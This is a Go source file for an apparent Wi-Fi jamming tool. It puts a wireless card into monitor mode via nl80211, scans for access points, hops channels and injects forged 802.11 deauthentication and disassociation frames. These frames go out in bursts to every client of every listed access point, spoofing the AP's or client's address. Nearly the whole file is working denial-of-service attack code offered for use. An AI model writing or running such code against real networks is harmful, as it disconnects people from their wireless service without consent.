package main

import (
	"errors"
	"fmt"
	"log"
	"math/rand"
	"net"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mdlayher/genetlink"
	"github.com/mdlayher/netlink"
)

type JamConn		struct {
	lastDeauth		time.Time
	lastChanSwitch	time.Time
	lastAPScan		time.Time
	currentFreq		uint32
	nlconn			*genetlink.Conn
	ifa				*net.Interface
	fam				*genetlink.Family
	handle			*pcap.Handle
}

func	(conn *JamConn)	SetLastDeauth(lastDeauth time.Time) {

	conn.lastDeauth = lastDeauth
}

func	(conn *JamConn)	SetLastAPScan(lastAPScan time.Time) {

	conn.lastAPScan = lastAPScan
}

func	(conn *JamConn)	SetLastChanSwitch(lastChanSwitch time.Time) {

	conn.lastChanSwitch = lastChanSwitch
}

func	_NewJamConn(nlconn *genetlink.Conn, ifa *net.Interface, fam *genetlink.Family) *JamConn {

	conn := new(JamConn)
	conn.nlconn = nlconn
	conn.ifa = ifa
	conn.fam = fam
	return conn
}

func	NewJamConn(ifaName string) (*JamConn, error) {

	nlconn, err := genetlink.Dial(nil)
	if err != nil {
		return nil, errors.New("genetlink.Dial() " + err.Error())
	}
	ifa, err := getInterface(ifaName)
	if err != nil {
		log.Fatalln(err)
	}
	fam, err := getDot11Family(nlconn)
	if err != nil {
		return nil, errors.New("getDot11Family() " + err.Error())
	}
	return _NewJamConn(nlconn, &ifa, fam), nil
}

func	(conn *JamConn)	SetDeviceChannel(c int) error {

	if c < 0 || c > len(ChanArrG) - 1 {
		return errors.New("invalid channel")
	}
	chann := layers.RadioTapChannelFrequency(ChanArrG[c].CenterFreq)
	if err := conn.SetDeviceFreq(chann); err != nil {
		return errors.New("conn.SetDeviceFreq() " + err.Error())
	}
	return nil
}

func	(conn *JamConn)	SetDeviceFreq(freq layers.RadioTapChannelFrequency) error {

	chann, ok := ChanMapG[uint16(freq)]
	if !ok {
		return errors.New("channel not found " + freq.String())
	}
	if !OptsG.FiveGhzSupport && chann.CenterFreq > 5000 {
		return nil
	}
	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	encoder.Uint32(nl80211.ATTR_WIPHY_FREQ, chann.CenterFreq)
	encoder.Uint32(ATTR_CHANNEL_WIDTH, chann.ChanWidth)
	encoder.Uint32(ATTR_CENTER_FREQ, chann.CenterFreq)
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_SET_CHANNEL,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		if err.Error() == "invalid argument" {
			OptsG.FiveGhzSupport = false
			if !OptsG.GuiMode {
				fmt.Printf("cannot change to frequency %dMhz\n", chann.CenterFreq)
			}
			return nil
		}
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	conn.currentFreq = chann.CenterFreq
	return nil
}

func	(conn *JamConn)	SendScanAbort() error {

	encoder := netlink.NewAttributeEncoder()

	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_ABORT_SCAN,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		if err != syscall.ENOENT {
			return errors.New("genetlink.Conn.Execute() " + err.Error())
		} else if !OptsG.GuiMode {
			fmt.Println("no active scan")
		}
	} else {
		if !OptsG.GuiMode {
			fmt.Println("scan aborted")
		}
	}
	return nil
}

func	(conn *JamConn)	GetScanResults() ([]AP, error) {

	encoder := netlink.NewAttributeEncoder()

	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsDump
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return nil, errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_GET_SCAN,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	msgs, err := conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return nil, errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return decodeScanResults(msgs)
}

func	(conn *JamConn)	SetFilterForTargets() error {

	var bpfExpr	string

	bpfExpr = fmt.Sprintf("wlan type data and not ether host %s and not ether host %s", conn.ifa.HardwareAddr.String(), BroadcastAddr)
	if err := conn.handle.SetBPFFilter(bpfExpr); err != nil {
		return errors.New("pcap.Handle.SetPBFFilter() " + err.Error())
	}
	return nil
}

func	(conn *JamConn)	SetupPcapHandle() error {

	inactive, err := pcap.NewInactiveHandle(conn.ifa.Name)

	defer inactive.CleanUp()
	if err != nil {
		log.Fatalln("pcap.NewInactiveHandle() ", err)
	}
	if err := inactive.SetBufferSize(DefPcapBufLen ); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetSnapLen(1024); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetTimeout(time.Millisecond * 100); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetRFMon(true); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetPromisc(true); err != nil {
		log.Fatalln(err)
	}
	conn.handle, err = inactive.Activate()
	if err != nil {
		return errors.New("pcap.InactiveHandle.Activate()" + err.Error())
	}
	return nil
}

/* Playing around with making and removing virtual interfaces */
func	(conn *JamConn)	MakeMonIfa() error {

	encoder := netlink.NewAttributeEncoder()

	encoder.Uint32(nl80211.ATTR_IFTYPE, nl80211.IFTYPE_MONITOR)
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	encoder.String(nl80211.ATTR_IFNAME, "mon42")
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_NEW_INTERFACE,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return nil
}

func	(conn *JamConn)	DelMonIfa() error {

	encoder := netlink.NewAttributeEncoder()

	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_DEL_INTERFACE,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return nil
}

func	(conn *JamConn)	SetIfaType(ifaType uint32) error {

	encoder := netlink.NewAttributeEncoder()

	encoder.Uint32(nl80211.ATTR_IFTYPE, ifaType)
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_SET_INTERFACE,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return nil
}

func	(conn *JamConn) DoAPScan(apWList *List, apList *List) (err error) {

	if err := conn.SetIfaType(nl80211.IFTYPE_STATION); err != nil {
		return errors.New("JamConn.SetIfaType() " + err.Error())
	}
	defer func() {
		if err := conn.SetIfaType(nl80211.IFTYPE_MONITOR); err != nil {
			log.Fatalln("JamConn.SetIfaType()", err)
		}
	}()
	scanMCID, err := getDot11ScanMCID(conn.fam)
	if err != nil {
		return errors.New("getDot11ScanMCID() " + err.Error())
	}
	if err := conn.nlconn.JoinGroup(scanMCID); err != nil {
		return errors.New("genetlink.Conn.JoinGroup() " + err.Error())
	}
	if ok, err := conn.TriggerScan(); !ok {
		if err.Error() == "scan failed" {
			//retry scan once
			if ok, err := conn.TriggerScan(); !ok {
				return errors.New("JamConn.TriggerScan() " + err.Error())
			}
		}
		return errors.New("JamConn.TriggerScan() " + err.Error())
	}
	results, err := conn.GetScanResults()
	if err != nil {
		return errors.New("JamConn.GetScanResults() " + err.Error())
	}
	if err := conn.nlconn.LeaveGroup(scanMCID); err != nil {
		return errors.New("genetlink.LeaveGroup() " + err.Error())
	}
	conn.SetLastAPScan(time.Now())
	appendApList(results, apList, apWList)
	if !OptsG.GuiMode {
		fmt.Println("AP scan successful")
	}
	return nil
}

func	(conn *JamConn)	DoAPScanIfPast(timeout time.Duration, apWList *List, apList *List) {

	if time.Since(conn.lastAPScan) > timeout {
		if err := conn.DoAPScan(apWList, apList); err != nil {
			log.Fatalln("JamConn.DoAPScan() " + err.Error())
		}
	}
}

func	(conn *JamConn) AttackIfPast(timeout time.Duration, count uint16, apList *List) {

	if time.Since(conn.lastDeauth) > timeout {
		for _, v := range apList.contents {
			ap := v.(AP)
			if ap.tap.ChannelFrequency != 0 {
				if err := conn.SetDeviceFreq(ap.tap.ChannelFrequency); err != nil {
					if !OptsG.GuiMode {
						fmt.Println(err)
					}
				}
			}
			for _, cli := range ap.clients {
				//Previous authentication no longer valid.
				nPkt, nByte, err := conn.Deauthenticate(
					count, 0x2,
					ap.hwaddr, cli.hwaddr,
					ap.tap, ap.dot)
				if err != nil {
					if err.Error() == "send: Bad file descriptor" {
						QuitG = true
						return
					} else {
						log.Panicln("JamConn.Deauthenticate() " + err.Error())
					}
				}
				StatsG.nByteTx += uint64(nByte)
				StatsG.nPktTx += uint64(nPkt)
				StatsG.nDeauth += uint32(nPkt)
				ap.nDeauth += uint32(nPkt)
				cli.nDeauth += uint32(nPkt)
				nPkt, nByte, err = conn.Disassociate(
					count, layers.Dot11ReasonDisasStLeaving,
					cli.hwaddr, ap.hwaddr,
					cli.tap, cli.dot)
				if err != nil {
					if err.Error() == "send: Bad file descriptor" {
						QuitG = true
						return
					} else {
						log.Panicln("JamConn.Deauthenticate() " + err.Error())
					}
				}
				StatsG.nByteTx += uint64(nByte)
				StatsG.nPktTx += uint64(nPkt)
				StatsG.nDisassc += uint32(nPkt)
				ap.nDisassc += uint32(nPkt)
				cli.nDisassc += uint32(nPkt)
				APListMutexG.Lock()
				apList.Add(apKey(ap.hwaddr.String()), ap)
				APListMutexG.Unlock()
			}
		}
		conn.SetLastDeauth(time.Now())
	}
}

func	randInt(min int, max int) int {

	return min + rand.Intn(max-min)
}

func	createDot11Header(
			msgType layers.Dot11Type,
			src net.HardwareAddr,dst net.HardwareAddr,
			seq uint16, duration uint16) layers.Dot11 {

	return layers.Dot11{
		Type: msgType,
		Proto: 0,
		Flags: layers.Dot11Flags(0),
		DurationID: duration,
		//dst
		Address1: dst,
		//src
		Address2: src,
		//recv
		Address3: dst,
		//trans
		Address4: src,
		SequenceNumber: seq,
		FragmentNumber: 0,
	}
}

func	(conn *JamConn)	Deauthenticate(
			count uint16, reason layers.Dot11Reason,
			src net.HardwareAddr, dst net.HardwareAddr,
			tap layers.RadioTap, dot11Orig layers.Dot11) (nPkts uint32, nBytes uint32, err error) {

	var i			uint16
	var opts		gopacket.SerializeOptions
	var buff		gopacket.SerializeBuffer
	var nByte		uint32
	var nPkt		uint32

	opts.ComputeChecksums = true
	opts.FixLengths = true
	if !OptsG.GuiMode {
		fmt.Printf("sending %d deauth frames from src %s - to %s\n", count, src.String(), dst.String())
	}
	dot11 := createDot11Header(
		layers.Dot11TypeMgmtDeauthentication, src, dst,
		dot11Orig.DurationID, dot11Orig.SequenceNumber + i)
	mgmt := layers.Dot11MgmtDeauthentication { Reason: reason }
	for i = 0; i < count; i++ {
		buff = gopacket.NewSerializeBuffer()
		if err := gopacket.SerializeLayers(buff, opts, &tap, &dot11, &mgmt); err != nil {
			return nPkt, nByte, err
		}
		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
			if err.Error() == "send: Resource temporarily unavailable" {
				return nPkt, nByte, nil
			}
			return nPkt, nByte, err
		}
		nPkt += 1
		nByte += uint32(len(buff.Bytes()))
		dot11.SequenceNumber += 1
	}
	return nPkt, nByte, nil
}

func	(conn *JamConn)	Disassociate(
	count uint16, reason layers.Dot11Reason,
	src net.HardwareAddr, dst net.HardwareAddr,
	tap layers.RadioTap, dot11Orig layers.Dot11) (nPkts uint32, nBytes uint32, err error) {

	var i			uint16
	var opts		gopacket.SerializeOptions
	var buff		gopacket.SerializeBuffer
	var nByte		uint32
	var nPkt		uint32

	opts.ComputeChecksums = true
	opts.FixLengths = true
	if !OptsG.GuiMode {
		fmt.Printf("sending %d deauth frames from src %s - to %s\n", count, src.String(), dst.String())
	}
	dot11 := createDot11Header(
		layers.Dot11TypeMgmtDisassociation, src, dst,
		dot11Orig.DurationID, dot11Orig.SequenceNumber + i)
	mgmt := layers.Dot11MgmtDisassociation { Reason: reason }
	for i = 0; i < count; i++ {
		buff = gopacket.NewSerializeBuffer()
		if err := gopacket.SerializeLayers(buff, opts, &tap, &dot11, &mgmt); err != nil {
			return nPkt, nByte, err
		}
		if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
			if err.Error() == "send: Resource temporarily unavailable" {
				return nPkt, nByte, nil
			}
			return nPkt, nByte, err
		}
		nPkt += 1
		nByte += uint32(len(buff.Bytes()))
		dot11.SequenceNumber += 1
	}
	return nPkt, nByte, nil
}


func	(conn* JamConn)	TriggerScan() (bool, error) {

	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	// wildcard scan
	encoder.Bytes(nl80211.ATTR_SCAN_SSIDS, []byte(""))

	attribs, err := encoder.Encode()
	if err != nil {
		return false, errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_TRIGGER_SCAN,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Send(req, conn.fam.ID, flags)
	if err != nil {
		return false, errors.New("genetlink.Conn.Send() " + err.Error())
	}
	done := false
	for !done {
		msgs, _, err := conn.nlconn.Receive()
		if err != nil {
			if err.Error() == "device or resource busy" {
				continue
			}
			return false, errors.New("genetlink.Conn.Recieve() " + err.Error())
		}
		for _, m := range msgs {
			switch m.Header.Command {
			case nl80211.CMD_NEW_SCAN_RESULTS:
				done = true
				break
			case nl80211.CMD_SCAN_ABORTED:
				return false, errors.New("scan failed")
			default:
				break
			}
		}
	}
	return true, nil
}
